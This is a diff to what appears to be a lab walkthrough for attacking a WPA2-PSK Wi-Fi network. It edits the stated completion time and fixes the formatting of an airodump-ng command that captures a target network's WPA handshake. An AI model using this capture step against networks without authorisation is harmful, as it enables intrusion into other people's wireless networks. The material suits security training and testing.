@@ -1,6 +1,6 @@
 
 # 🛡️ WPA2-PSK Attack
-## Time to complete the attack: 9 minutes
+## Time to complete the attack: 7 minutes
 
 ## ⚙️ 0. Initial Setup
 
@@ -52,7 +52,7 @@ bssid='F0:9F:C2:71:22:12'
 client='28:6C:07:6F:F9:43'
 essid='wifi-mobile'
 
-sudo airodump-ng -c ${channel}  -w ${dumpfile} --output-format pcap,csv --essid ${essid} --bssid ${bssid} wlan0mon```
+sudo airodump-ng -c ${channel}  -w ${dumpfile} --output-format pcap,csv --essid ${essid} --bssid ${bssid} wlan0mon
 ```
 Keep this running! **You're sniffing for the WPA handshake**.
 
